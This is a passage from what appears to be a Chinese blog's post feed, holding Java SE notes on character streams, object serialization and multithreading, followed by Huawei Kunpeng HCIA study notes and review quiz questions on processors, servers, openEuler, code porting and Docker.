ch;        while ((ch=isr.read())!=-1) &#123;            System.out.print((char)ch);        &#125;        isr.close();    &#125;&#125;</code></pre><p><strong>4、字符流写数据的5种方式</strong>：</p><p>方法介绍：</p><p><img src="https://img-blog.csdnimg.cn/20200917201539934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>刷新和关闭的方法：</p><p><img src="https://img-blog.csdnimg.cn/20200917201740807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br> 刷新流作用：刷新缓冲，写入数据。</p><p><strong>5、字符流读数据的2种方式</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200917201836496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>6、字符缓冲流</strong>：</p><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200920163849290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>7、字符缓冲流特有功能</strong>：</p><p>BufferedWriter：</p><p>写一个换行符，由操作系统系统决定。<br><img src="https://img-blog.csdnimg.cn/20200920165440690.png#pic_center"></p><p>BufferedReader:</p><p><img src="https://img-blog.csdnimg.cn/20200920165500154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>8、字符缓冲流特有功能复制Java文件</strong>：</p><p>代码实现：</p><pre><code class="java">public class CopyJavaDemo02 &#123;    public static void main(String[] args) throws IOException &#123;        //根据数据源创建字符缓冲输入流对象        BufferedReader br = new BufferedReader(new FileReader(&quot;myCharStream\\ConversionStreamDemo.java&quot;));        //根据目的地创建字符缓冲输出流对象        BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;myCharStream\\Copy.java&quot;));        //读写数据，复制文件        //使用字符缓冲流特有功能实现        String line;        while ((line=br.readLine())!=null) &#123;            bw.write(line);            bw.newLine();//换行            bw.flush();        &#125;        //释放资源        bw.close();        br.close();    &#125;&#125;</code></pre><p><strong>9、IO流小结</strong>：</p><p> 字节流：<br><img src="https://img-blog.csdnimg.cn/202009201715519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><blockquote><p>字节流可以复制任意文件数据，一般采用字节缓冲流一次读写一个字节数组的方式</p></blockquote><p>字符流：</p><p><img src="https://img-blog.csdnimg.cn/20200920171620468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><blockquote><p> 字符流只能复制文本数据，一般使用字符缓冲流。</p></blockquote><h4 id="25、IO特殊操作流"><a href="#25、IO特殊操作流" class="headerlink" title="25、IO特殊操作流"></a>25、IO特殊操作流</h4><p><strong>1、标准输入流</strong>：</p><p><strong>System</strong> 类中有两个静态的成员变量</p><ul><li><p>public static final InputStream in：标准输入流。通常该流对应于键盘输入或由主机环境或用户指定的另一个输入源。(InputStream是返回值类型 in是方法，可以直接由类直接调用)</p></li><li><p>public static final PrintStream out：标准输出流。通常该流对应于显示输出或由主机环境或用户指定的另一个输出目标。</p></li></ul><p>自己实现键盘录入数据:</p><pre><code class="java">BufferedReader br = new BufferedReader(new InputStreamReader(System.in));</code></pre><p>写起来太麻烦，Java就提供了一个类实现键盘录入:</p><pre><code class="java">Scanner sc = new Scanner(System.in);</code></pre><p> <strong>2、对象序列化流</strong>：</p><p>对象序列化介绍：</p><ul><li><p>对象序列化：就是将对象保存到磁盘中，或者在网络中传输对象；</p></li><li><p>这种机制就是使用一个字节序列表示一个对象，该字节序列包含：对象的类型、对象的数据和对象中存储的属性等信息。</p></li><li><p>字节序列写到文件之后，相当于文件中持久保存了一个对象的信息；反之，该字节序列还可以从文件中读取回来，重构对象，对它进行反序列化</p></li></ul><p>对象序列化流： ObjectOutputStream</p><ul><li>将Java对象的原始数据类型和图形写入OutputStream。 可以使用ObjectInputStream读取（重构）对象。 可以通过使用流的文件来实现对象的持久存储。 如果流是网络套接字流，则可以在另一个主机上或另一个进程中重构对象。</li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923232605414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>序列化对象的方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923232625425.png#pic_center"><br>示例代码：</p><p>学生类</p><pre><code class="java">public class Student implements Serializable &#123;    private String name;    private int age;    public Student() &#123;    &#125;    public Student(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class ObjectOutputStreamDemo &#123;    public static void main(String[] args) throws IOException &#123;    //ObjectOutputStream(OutputStream out)：创建一个写入指定的OutputStream的ObjectOutputStream    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;myOtherStream\\oos.txt&quot;));    //创建对象    Student s = new Student(&quot;林青霞&quot;,30);    //void writeObject(Object obj)：将指定的对象写入ObjectOutputStream    oos.writeObject(s);    //释放资源    oos.close();    &#125;&#125;</code></pre><p>注意事项：</p><ol><li>一个对象要想被序列化，该对象所属的类必须必须实现Serializable 接口</li><li>Serializable是一个标记接口，实现该接口，不需要重写任何方法</li></ol><p><strong>3、对象反序列化流</strong>：</p><p>对象反序列化流： ObjectInputStream</p><ul><li>ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象</li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923234533475.png#pic_center"><br>反序列化对象的方法：</p><p><img src="https://img-blog.csdnimg.cn/20200923234606377.png#pic_center"><br>示例代码：</p><pre><code class="java">public class ObjectInputStreamDemo &#123;    public static void main(String[] args) throws IOException,ClassNotFoundException &#123;    //ObjectInputStream(InputStream in)：创建从指定的InputStream读取的ObjectInputStream    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;myOtherStream\\oos.txt&quot;));    //Object readObject()：从ObjectInputStream读取一个对象    Object obj = ois.readObject();    Student s = (Student) obj;    System.out.println(s.getName() + &quot;,&quot; + s.getAge());    ois.close();    &#125;&#125;</code></pre><h4 id="26、多线程"><a href="#26、多线程" class="headerlink" title="26、多线程"></a>26、多线程</h4><p><strong>1、进程和线程</strong>：</p><p>进程：是正在运行的程序</p><ul><li>是系统进行资源分配和调用的独立单位</li><li>每一个进程都有它自己的内存空间和系统资源</li></ul><p>线程：是进程中的单个顺序控制流，是一条执行路径</p><ul><li>单线程：一个进程如果只有一条执行路径，则称为单线程程序</li><li>多线程：一个进程如果有多条执行路径，则称为多线程程序</li></ul><p><strong>2、实现多线程方式一：继承Thread类</strong></p><p>方法介绍：</p><p><img src="https://img-blog.csdnimg.cn/20200926171541923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>实现步骤：</p><ol><li>定义一个类MyThread继承Thread类</li><li>在MyThread类中重写run()方法</li><li>创建MyThread类的对象</li><li>启动线程</li></ol><p>例：</p><pre><code class="java">public class MyThread extends Thread &#123;    @Override    public void run() &#123;        for (int i = 0; i &lt; 100; i++) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class ThreadTest &#123;    public static void main(String[] args) &#123;        MyThread my1 = new MyThread();        MyThread my2 = new MyThread();        //void start() 导致此线程开始执行; Java虚拟机调用此线程的run方法        my1.start();        my2.start();    &#125;&#125;</code></pre><p>两个小问题：</p><p>为什么要重写run()方法？</p><ul><li>因为run()是用来封装被线程执行的代码</li></ul><p>run()方法和start()方法的区别？</p><ul><li>run()：封装线程执行的代码，直接调用，相当于普通方法的调用</li><li>start()：启动线程；然后由JVM调用此线程的run()方法</li></ul><p><strong>3、设置和获取线程名称</strong>：</p><p><img src="https://img-blog.csdnimg.cn/2020092617461151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>例：</p><p>获取main方法的线程名</p><pre><code class="java">public class ThreadTest &#123;    public static void main(String[] args) &#123;        System.out.println(Thread.currentThread().getName());    &#125;&#125;</code></pre><p><strong>4、线程优先级</strong>：</p><p>线程调度：</p><p>两种调度方式</p><ul><li>分时调度模型：所有线程轮流使用 CPU 的使用权，平均分配每个线程占用 CPU 的时间片。</li><li>抢占式调度模型：优先让优先级高的线程使用 CPU，如果线程的优先级相同，那么会随机选择一个，优先级高的线程获取的 CPU 时间片相对多一些。（Java使用的是抢占式调度模型）</li></ul><p>优先级相关方法：</p><p><img src="https://img-blog.csdnimg.cn/20200926180041158.png"><br>默认优先级为5</p><p><strong>5、线程控制</strong>：</p><p>相关方法：</p><p><img src="https://img-blog.csdnimg.cn/20200926180724781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>6、线程的生命周期</strong>：<br><img src="https://img-blog.csdnimg.cn/20200926182530650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>7、实现多线程方式二：实现Runnable接口</strong></p><p>Thread构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200927175751162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>实现步骤：</p><ol><li>定义一个类MyRunnable实现Runnable接口</li><li>在MyRunnable类中重写run()方法</li><li>创建MyRunnable类的对象</li><li>创建Thread类的对象，把MyRunnable对象作为构造方法的参数</li><li>启动线程</li></ol><p>例：</p><pre><code class="java">public class MyRunnable implements Runnable &#123;    @Override    public void run() &#123;        for(int i=0; i&lt;100; i++) &#123;            System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i);        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class MyRunnableDemo &#123;    public static void main(String[] args) &#123;        //创建MyRunnable类的对象        MyRunnable my = new MyRunnable();        //创建Thread类的对象，把MyRunnable对象作为构造方法的参数        //Thread(Runnable target)        // Thread t1 = new Thread(my);        // Thread t2 = new Thread(my);        //Thread(Runnable target, String name)        Thread t1 = new Thread(my,&quot;高铁&quot;);        Thread t2 = new Thread(my,&quot;飞机&quot;);        //启动线程        t1.start();        t2.start();    &#125;&#125;</code></pre><p>总结：</p><p>多线程的实现方案有两种:</p><ul><li>继承Thread类</li><li>实现Runnable接口</li></ul><p>相比继承Thread类，实现Runnable接口的好处:</p><ul><li>避免了Java单继承的局限性</li><li>适合多个相同程序的代码去处理同一个资源的情况，把线程和程序的代码、数据有效分离，较好的体现了面向对象的设计思想。<hr></li></ul><p>🆗，关于java的基础知识总结就到这里了，后面会接着学习Java EE 的 SpringMVC+Mybates框架。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为鲲鹏云HCIA知识总结（一）</title>
      <link href="2020/04/05/%E5%8D%8E%E4%B8%BA%E9%B2%B2%E9%B9%8F%E4%BA%91HCIA%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/04/05/%E5%8D%8E%E4%B8%BA%E9%B2%B2%E9%B9%8F%E4%BA%91HCIA%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>大二下学期有幸参加了华为鲲鹏云的一个训练营，自开营已经过去了一周时间，期间学到了很多新的知识，也拓宽了自己的眼界(●ˇ∀ˇ●)。训练营的最终目的是通过华为的HCIA认证，因此总结一下这几天的知识点。</p><a id="more"></a><p><img src="http://img-blog.csdnimg.cn/20200404174502101.png" alt="在这里插入图片描述"><br>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大二下学期有幸参加了华为鲲鹏云的一个训练营，自开营已经过去了一周时间，期间学到了很多新的知识，也拓宽了自己的眼界(●ˇ∀ˇ●)。训练营的最终目的是通过华为的HCIA认证，因此总结一下这几天的知识点。</p><p>不得不说这几天学习的内容是挺多的，内容也很琐碎，看来想通过这个认证着实不容易，好了开始总结知识点&nbsp;(ง •_•)ง</p><h3 id="第一章-鲲鹏介绍"><a href="#第一章-鲲鹏介绍" class="headerlink" title="第一章 鲲鹏介绍"></a>第一章 鲲鹏介绍</h3><p>这章在考试大纲中占10%，而且全是理论知识，主要介绍了鲲鹏计算产业以及鲲鹏生态，华为鲲鹏处理器的架构，型号与规格，技术创新与应用场景，TaiShan200机架服务器和高密服务器，华为云鲲鹏云服务，鲲鹏计算平台的操作系统兼容性以及openEuler开源操作系统的发展和特性等内容。记录一下重点的内容。</p><ul><li><p>2019年华为推出的鲲鹏920处理器是业界第一颗7nm工艺处理器。</p></li><li><p>鲲鹏生态兼容的操作系统介绍：<br><img src="http://img-blog.csdnimg.cn/20200404174417722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>华为鲲鹏伙伴计划<br><img src="http://img-blog.csdnimg.cn/20200404174726330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>思考题：</p></li></ul><ol><li><p>华为鲲鹏计算产业相关产品有哪些？（ ABC ）<br>A、华为鲲鹏处理器<br>B、TaiShan服务器<br>C、华为云鲲鹏云服务</p></li><li><p>围绕鲲鹏计算产业，华为提供（ ABCD ）支持。<br>A、云服务<br>B、工具链<br>C、社区服务<br>D、专业服务</p></li></ol><ul><li>华为鲲鹏处理器架构介绍：</li></ul><p>华为鲲鹏处理器基于ARM架构。ARM是一种CPU架构，有别于Intel、AMD CPU采用的<strong>CISC</strong>复杂指令集，ARM CPU采用<strong>RISC</strong>精简指令集（reduced instruction set computer，精简指令集计算机）。</p><ul><li><p>Kunpeng 920内置多种加速引擎，同时TaiShan 200服务器基于Kunpeng 920芯片提供的硬件加速解决方案，包含了<code>对称加密</code>、<code>非对称加密</code>和<code>数字签名</code>、<code>压缩解压缩</code>等算法。</p></li><li><p>Kunpeng 920加速器简介：<br><img src="http://img-blog.csdnimg.cn/20200404182900137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>思考题</p></li></ul><ol><li><p>Kunpeng 920加速器子系统需要安装？（√）</p></li><li><p>Suse操作系统是从哪个版本开始处于Kunpeng 920的OS生态圈？（D）<br>A. SLES 12.3<br>B. SLES 12.4<br>C. SLES 15<br>D. SLES 15.1</p></li><li><p>以下哪些关于华为鲲鹏920处理器的描述是正确的？（ ABCD）<br>A.采用了7nm的制造工艺；<br>B.支持8通道的DDR4控制器；<br>C.支持PCIe 4.0接口，并兼容PCIe 3.0/2.0/1.0；<br>D.支持多种加速器；</p></li><li><p>华为鲲鹏920处理器内置了那些加速器？（ABC）<br>A、SSL加速引擎<br>B、加解密加速引擎<br>C、压缩解压缩加速引擎</p></li><li><p>以下哪些属于华为鲲鹏920芯片的特点？（BC）<br>A. 集成最多64个自研核(128)<br>B. 支持8通道DDR4控制器<br>C. 支持CCIX接口<br>D. 只支持GE/10GE网络</p></li></ol><p><strong>TaiShan服务器系列介绍：</strong></p><ul><li><p>第一代TaiShan 100服务器是基于鲲鹏916处理器，2016年推出市场。2019年推出TaiShan 200服务器基于最新的鲲鹏920处理器，是市场的主打产品。</p></li><li><p>TaiShan服务器目前已经规模商用的有2280均衡型、5280存储型，X6000高密型。</p></li></ul><p><strong>思考题</strong></p><ol><li><p>以下哪项不是TaiShan服务器的优点？（D）</p><pre><code> A. 国产化，自主安全可控 B. 多物理核心，并发性能高 C. 低功耗，绿色节能 D. 生态完备，上层应用支持好</code></pre></li><li><p>TaiShan 200机架服务器包含哪些型号？(ABC)<br>  A.2280<br>  B.5280<br>  C.2480<br>  D.X6000(X6000属于高密服务器)</p></li></ol><ul><li>鲲鹏弹性云服务器优势：覆盖全场景；极致性价比；与x86实例功能一致；生态丰富。</li></ul><p><strong>思考题</strong></p><ol><li><p>鲲鹏弹性云服务器的种类不包含的是 ？(D)</p><pre><code> A. 通用型    B. 存储密集型 C. 内存密集型 D. 网络密集型</code></pre></li><li><p>华为鲲鹏BMS(华为鲲鹏裸金属服务器）云服务器最高可提供多少核？(D)<br>  A.32<br>  B.48<br>  C.64<br>  D.128</p></li><li><p>Android手机应用在鲲鹏云服务上运行仍需要指令翻译器？（X）</p></li><li><p>华为鲲鹏云服务包括以下哪些？(ABCD)</p><pre><code> A. 华为鲲鹏裸金属服务器 B. 鲲鹏弹性云服务器 C. 鲲鹏容器 D. 鲲鹏云手机</code></pre></li><li><p>云手机支持哪些场景？<br>1、智能应用托管<br>2、云游戏<br>3、移动安全办公</p></li><li><p>华为云鲲鹏云手机优势 ？（ABCD）</p><pre><code> A. 基于华为自硏芯片及硬件底座 B. 支持自研高性能GPU C. 兼容32/64位ARM原生指令 D. Monbox双ZOS共内核架构</code></pre></li><li><p>只有华为云提供了arm服务器?（X）</p></li></ol><ul><li>云容器引擎（Cloud Container Engine，CCE）,云容器实例（Cloud Container Instance， CCI）</li></ul><p><strong>华为鲲鹏处理器OS兼容性：</strong><br>目前鲲鹏处理器仅支持Linux类型操作系统，包括：<br><img src="http://img-blog.csdnimg.cn/20200404205119478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>思考题：</strong></p><ol><li>Linux操作系统之父是谁？<br>Linus Torvalds</li><li>TaiShan服务器支持哪个中标麒麟版本？（A）<br> A、支持NeoKylin Server v5.0 U5<br> B、支持NeoKylin Server v4.0 U4<br> C、Kylin Server v5.0 U5<br> D、Kylin Server v4.0 U4</li></ol><ul><li><p>openEuler概述：<br>openEuler是一款开源操作系统（2019年开源）。当前openEuler内核源于Linux，支持鲲鹏及其它多种处理器，能够充分释放计算芯片的潜能，是由全球开源贡献者构建的高效、稳定、安全的开源操作系统。</p></li><li><p>鲲鹏计算平台已经兼容的操作系统可通过<code>http://support.huawei.com/onlinetoolweb/ftca/index?serise=9</code> 链接查询。</p></li></ul><p><strong>思考题：</strong></p><ol><li>欧拉操作系统可以装在以下哪些服务器上？（D）<pre><code> A.RH5885 V5 B.RH5885 V3 C.TaiShan 100 D.TaiShan 200</code></pre></li><li>以下那些内容不享受鲲鹏服务？（C）<pre><code> A.购买Taishan服务器 B.购买鲲鹏云服务 C.购买RH服务器</code></pre></li></ol><p>I.openEuler OS是哪年开源的？（D）<br>    A、2010        B、2016        C、2018        D、2019</p><p>II. 请判断：A-Tune是一种通过非侵入式系统画像的负载感知方法，识别业务并匹配最佳资源模型，实时响应业务特征变化的AI自动调优系统。（√）</p><p>III.哪些操作系统是国内的操作系统？<br><img src="http://img-blog.csdnimg.cn/20200404212152325.png" alt="在这里插入图片描述"><br>Ⅳ. 鲲鹏芯片都可以应用在哪些地方？<br>    Taishan服务器和华为鲲鹏云服务。</p><h3 id="第二章-应用移植"><a href="#第二章-应用移植" class="headerlink" title="第二章 应用移植"></a>第二章 应用移植</h3><p>这章的知识点占比为<strong>25%</strong> ，介绍了华为鲲鹏平台应用移植的相关知识，并且做了两个实验（实验后面也会复现出来）包括软件迁移至鲲鹏计算平台的整个实施过程。并从服务器和容器两种应用载体出发，介绍了Kunpeng Porting Advisor迁移工具的使用和容器迁移操作步骤。</p><ul><li><p>问：在使用鲲鹏处理器时，为什么要做软件迁移？<br>答：鲲鹏处理器与x86处理器的指令存在差异。</p></li><li><p>编译型语言：典型的如<code>C/C++</code>和<code>Go</code>语言，都属于编译型语言。编译型语言开发的程序在从x86处理器迁移到鲲鹏处理器时，必须经过重新编译才能运行。</p></li><li><p>从源码到程序的过程：源码需要由编译器、汇编器翻译成机器指令，再通过链接器链接库函数生成机器语言程序。机器语言必须与CPU的指令集匹配，在运行时通过加载器加载到内存，由CPU执行指令。</p></li></ul><p><img src="http://img-blog.csdnimg.cn/20200404220349151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_5pyq5a6M5oiQ55qE5q2Msize_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>解释型语言：典型的如<code>Java/Python</code>语言，都属于解释型语言，解释型语言开发的程序在迁移到鲲鹏处理器时，一般不需要重新编译。</li><li>解释型语言的源代码由编译器生成字节码，然后再由虚拟机解释执行。虚拟机将不同CPU指令集的差异屏蔽，因此解释型语言的可移植性很好。但是如果程序中调用了编译型语言所开发的so库，那么这些so库需要重新移植编译。</li></ul><p><img src="http://img-blog.csdnimg.cn/20200404220652801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_5pyq5a6M5oiQ55qE5q2M,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>1.对于解释性语言编写的程序，可直接部署在Kunpeng平台；</li><li>2.对于C/C++等编译型语言编写的程序（开源软件、自研软件），如果可以获得源代码，可重新编译后部署；如果无法获得源代码可选用其它支持Kunpeng平台的可替代软件；如果无其它替代软件，可选用混合部署方案。</li></ul><p><strong>C/C++代码builtin函数、数据类型移植</strong></p><ul><li>在x86和鲲鹏处理器下，C/C++语言中默认的char类型有所不同，x86下默认的char类型是有符号的char类型，而鲲鹏处理器下则是无符号的char，因此需要移植修改。当然，也可以增加编译选项屏蔽这种差异，详细的修改方法可以参考《TaiShan代码移植指导》</li><li>Builtin函数是编译器提供的一套函数。编译器实现的builtin函数通常是通过cpu的指令实现某些频繁调用的函数，以达到很高的性能。这里的示例是crc32的校验函数，还有一个是将数据预取到cache的汇编指令，改成使用编译器自带的builtin函数。既保证了性能，又提升了可移植性。</li></ul><p> <strong>华为鲲鹏代码迁移工具</strong></p><ul><li>处理器所支持的指令集不同，意味着开发者可能需要对代码进行跨平台的移植。为了解决用户代码移植性人工排查困难、移植经验欠缺、反复依赖编译调错定位等，投入工作量大，整体效率低的问题，华为推出<strong>Kunpeng Porting Advisor</strong>华为鲲鹏代码迁移工具。</li></ul><p><strong>华为鲲鹏代码迁移工具提供CLI和Web两种访问方式，只能选择一种安装。</strong></p><ul><li>CLI方式：<br>   通过命令行方式使用代码迁移工具各功能，最终移植分析结<pre><code>果输出到`.csv`文件，用户可以根据移植建议进行处理。    </code></pre></li><li>Web方式：<br>   通过浏览器远程使用代码迁移工具各功能，最终移植分析结<pre><code> 果输出到`.csv`或者`.html`文件中，用户可以根据移植建议进行 处理。工具只允许**一个**用户工作，**不支持**多用户在线和并发 访问。</code></pre></li><li><code>csv</code>和<code>html</code>报告中包含源码扫描的基本信息、需要移植的依赖库SO文件列表以及移植建议、需要移植的源文件列表以及源码所在行号、移植建议。</li></ul><p><strong>3、容器迁移指导</strong></p><ul><li>什么是容器？</li></ul><p>容器是一种轻量级、可移植、自包含的软件打包技术，使应用程序可以在几乎任何地方以相同的方式运行。</p><ul><li>容器与虚拟机的区别？<br><img src="http://img-blog.csdnimg.cn/20200404232448899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>对于容器，它首先是一个相对独立的运行环境，在这一点有点类似于虚拟机，但是不像虚拟机那样彻底。在容器内，应该最小化其对外界的影响，比如不能在容器内把宿主机上的资源全部消耗，这就是资源控制。</li><li>左图虚拟机的Guest OS层和Hypervisor层在docker中被Docker Engine层所替代</li><li>虚拟机的Guest OS即为虚拟机安装的操作系统，它是一个完整操作系统内核</li><li>所有的容器共享同一个 Host OS ，这使得容器在体积上要比虚拟机小很多</li></ul><p><strong>Docker容器与镜像</strong></p><ul><li>镜像是一个静态的概念，类似于面向对象编程中的类，容器是动态的概念，已经镜像运行起来就成为一个容器也就是类似于面向对象中的一个对象实例。</li><li>在Docker镜像分为基础镜像和父镜像，没有父镜像的镜像被称为基础镜像。用户是基于基础镜像来制作各种不同的应用镜像。这些应用镜像共享同一个基础镜像层，提高了存储效率。</li></ul><p><strong>Docker容器迁移策略</strong></p><ul><li>Docker容器迁移有两种策略：使用Docker pull获取镜像或使用Dockerfile构建镜像。<br><img src="http://img-blog.csdnimg.cn/20200404233336302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p><strong>思考题：</strong></p><ol><li><p>鲲鹏处理器和x86处理器的add指令是一样的。（B）<br> A. True<br> B. False</p></li><li><p>请选岀X86处理器汇编指令 ？（BC）<br> A. Idr x0, [sp,#8]    |从内存将变量b的值放入寄存器x1<br> B. add %edx,%eax    |将edx(a)中的值加上eax(b)的值放入eax寄存器<br> C. mov -0x8(%rbp),%eax    |从内存将变量b的值放入寄存器的x1<br> D. str x0, [spf,#5]    |将甸寄存器的值存入内存(变量c)</p></li><li><p>以下哪些是非编译型（解释型）语言？(BC)<br> A.Pascal<br> B.Perl<br> C.Ruby<br> D.C/C++</p></li><li><p>纯Java语言开发的代码，无依赖的SO库文件不需要编译，可以直接在JVM（Java虚拟机）中运行。（A）<br> A. True<br> B. False</p></li><li><p>为什么x86架构处理器上的软件在鲲鹏处理器使用时需要移植？（ ABCD）<br>A、两种处理器的指令集不同<br>B、源代码需要按照目标处理的指令集编译成指令才能运行<br>C、编译型语言由编译器静态编译成指令和数据<br>D、解释型语言由语言的虚拟机在运行时将源码/字节码编译成指令和数据</p></li><li><p>Porting Advisor工具默认是访问端口是什么？<br> A、8080        B、8083        C、8084        D、8086</p></li><li><p>Porting Advisor默认用户名和密码是什么？<br> A、portadmin 默认密码为admin@9000<br> B、Portadmin 默认密码为Admin@9000<br> C、portadmin 默认密码为Admin@9000<br> D、Portadmin 默认密码为admin@9000</p></li><li><p>对于迁移工具的CLI页面以下说法正确的是（A）<br> A、仅支持输出csv的文件<br> B、支持输出html文件<br> C、支持输出xlsx文件<br> D、支持输出doc文件</p></li><li><p>使用如下CLI命令进行代码分析时，以下哪个参数是可选的 ？(B)<br> A. 源代码所在路径：-S source<br> B. 编译器版本：-C compiler<br> C. 软件构建命令：—cmd cmd<br> D. 软件移植的目标操作系统的信息：—tos tos</p></li><li><p>华为鲲鹏代码迁移工具适用于以下哪些类型的应用程序？（ ABC ）<br>A. C/C++<br>B. Java<br>C. 汇编<br>D. Python</p></li><li><p>华为鲲鹏代码迁移工具能够提供（ BC ）方面的移植评估结果。<br>A. 扫描源码中有多少个安装包<br>B. 扫描源码中有多少可以移植的依赖库SO文件<br>C. 扫描源码中有多少行可以移植的C/C++代码、汇编代码<br>D. 预估移植所需的工作量</p></li><li><p>Porting Advisor工具在移植源码过程中的作用是？（  B ）<br>A. 分析源码，并给出移植工作量<br>B. 分析源码，并给出分析报告和源码修改建议<br>C. 分析源码，并修改源码<br>D. 分析源码，并给出性能优化建议</p></li><li><p>以下哪条命令可以查看docker镜像？(A)<br>A. docker images<br>B. docker list<br>C. docker container ls<br>D. docker -a</p></li><li><p>构建docker镜像有哪些方式？( AB )<br>A、Docker pull获取镜像<br>B、Dockerfile构建镜像<br>C、Docker run<br>D、Docker ps</p></li><li><p>关于Dockerfile的描述，以下哪些是正确的 